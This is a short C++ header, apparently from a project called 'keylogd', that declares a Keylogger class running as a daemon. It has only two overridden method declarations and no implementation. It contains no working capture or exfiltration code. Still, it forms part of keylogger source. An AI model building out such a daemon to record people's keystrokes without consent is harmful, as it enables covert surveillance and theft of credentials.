//
// Created by dgomez on 28/09/17.
//

#ifndef KEYLOGD_KEYLOGGER_H
#define KEYLOGD_KEYLOGGER_H

#include "./daemon/daemon.h"

class Keylogger : public Daemon {
protected:
    void process() override; // Defines daemon functionality
    const char* get_daemon_name() override;

};

#endif //KEYLOGD_KEYLOGGER_H
